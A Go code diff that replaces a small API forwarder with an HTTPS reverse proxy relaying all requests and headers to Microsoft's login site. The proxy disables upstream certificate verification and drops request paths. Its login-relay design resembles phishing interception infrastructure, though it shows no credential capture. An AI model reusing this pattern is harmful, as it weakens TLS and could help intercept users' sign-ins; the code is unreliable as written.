@@ -1,84 +1,120 @@
 package main
 
 import (
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "log"
-    "net/http"
-    "os"
+	"crypto/tls"
+	"io"
+	"log"
+	"net/http"
+	"net/url"
+	"os"
+	"path/filepath"
 )
 
-const (
-    upstreamURL = "https://login.microsoftonline.com" // The upstream API URL
-)
+func handleProxy(w http.ResponseWriter, r *http.Request) {
+	targetURL, err := url.Parse("https://login.microsoftonline.com")
+	if err != nil {
+		http.Error(w, "Invalid target URL", http.StatusInternalServerError)
+		return
+	}
+
+	// Create the proxy request
+	proxyReq, err := http.NewRequest(r.Method, targetURL.String(), r.Body)
+	if err != nil {
+		http.Error(w, "Failed to create proxy request", http.StatusInternalServerError)
+		return
+	}
+
+	// Copy headers from the original request to the proxy request
+	for name, values := range r.Header {
+		for _, value := range values {
+			proxyReq.Header.Add(name, value)
+		}
+	}
+
+	// Create a custom HTTP client with TLS configuration
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true, // Don't verify the certificate (not recommended for production)
+	}
+	transport := &http.Transport{
+		TLSClientConfig: tlsConfig,
+	}
+	client := &http.Client{
+		Transport: transport,
+	}
+
+	// Perform the request
+	resp, err := client.Do(proxyReq)
+	if err != nil {
+		http.Error(w, "Failed to perform request to target server", http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Copy the headers from the response
+	for name, values := range resp.Header {
+		for _, value := range values {
+			w.Header().Add(name, value)
+		}
+	}
+
+	// Copy the status code from the response
+	w.WriteHeader(resp.StatusCode)
+
+	// Copy the body from the response
+	io.Copy(w, resp.Body)
+}
+
+func findCertAndKey() (string, string, error) {
+	// Specify the directory to search for SSL certificate and key files
+	certDir := "./certs"
+
+	// Define the expected certificate and key filenames
+	var certFile, keyFile string
+
+	// Walk through the directory to find the cert and key files
+	err := filepath.Walk(certDir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() {
+			if filepath.Ext(path) == ".crt" {
+				certFile = path
+			} else if filepath.Ext(path) == ".key" {
+				keyFile = path
+			}
+		}
+		return nil
+	})
+
+	if err != nil {
+		return "", "", err
+	}
+
+	// Check if both files were found
+	if certFile == "" || keyFile == "" {
+		return "", "", os.ErrNotExist
+	}
+
+	return certFile, keyFile, nil
+}
 
 func main() {
-    // Get the port from environment variables or default to 8080
-    port := os.Getenv("PORT")
-    if port == "" {
-        port = "8080"
-    }
+	http.HandleFunc("/", handleProxy)
 
-    // Define API routes
-    http.HandleFunc("/api/request", handleRequest)
-    http.HandleFunc("/api/preflight", handlePreflight)
+	// Attempt to find the SSL certificate and key files
+	certFile, keyFile, err := findCertAndKey()
+	if err != nil {
+		log.Fatal("Failed to find SSL certificate and key files:", err)
+	}
 
-    // Start the server
-    fmt.Printf("Starting server on port %s...\n", port)
-    if err := http.ListenAndServe("0.0.0.0:"+port, nil); err != nil {
-        log.Fatalf("Failed to start server: %v", err)
-    }
-}
+	// Configure HTTPS server
+	server := &http.Server{
+		Addr: ":8443",
+		TLSConfig: &tls.Config{
+			MinVersion: tls.VersionTLS12, // Ensure a minimum version of TLS
+		},
+	}
 
-// handleRequest handles the incoming requests from the frontend and forwards them to the upstream API
-func handleRequest(w http.ResponseWriter, r *http.Request) {
-    // Parse the incoming request body
-    var requestBody map[string]interface{}
-    err := json.NewDecoder(r.Body).Decode(&requestBody)
-    if err != nil {
-        http.Error(w, "Bad request", http.StatusBadRequest)
-        return
-    }
-
-    // Prepare the request to the upstream service
-    req, err := http.NewRequest("POST", upstreamURL+"/common/GetCredentialType?mkt=en-US", nil)
-    if err != nil {
-        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-        return
-    }
-
-    // Forward necessary headers
-    req.Header.Set("Content-Type", "application/json")
-    req.Header.Set("Authorization", r.Header.Get("Authorization"))
-
-    // Make the request to the upstream service
-    client := &http.Client{}
-    resp, err := client.Do(req)
-    if err != nil {
-        http.Error(w, "Upstream request failed", http.StatusInternalServerError)
-        return
-    }
-    defer resp.Body.Close()
-
-    // Read the response from the upstream service
-    body, err := ioutil.ReadAll(resp.Body)
-    if err != nil {
-        http.Error(w, "Failed to read upstream response", http.StatusInternalServerError)
-        return
-    }
-
-    // Forward the response back to the frontend
-    w.Header().Set("Content-Type", "application/json")
-    w.WriteHeader(resp.StatusCode)
-    w.Write(body)
-}
-
-// handlePreflight handles CORS preflight requests
-func handlePreflight(w http.ResponseWriter, r *http.Request) {
-    w.Header().Set("Access-Control-Allow-Origin", "*")
-    w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
-    w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
-    w.Header().Set("Access-Control-Allow-Credentials", "true")
-    w.WriteHeader(http.StatusOK)
+	log.Println("HTTPS proxy server is running on https://localhost:8443")
+	log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
 }
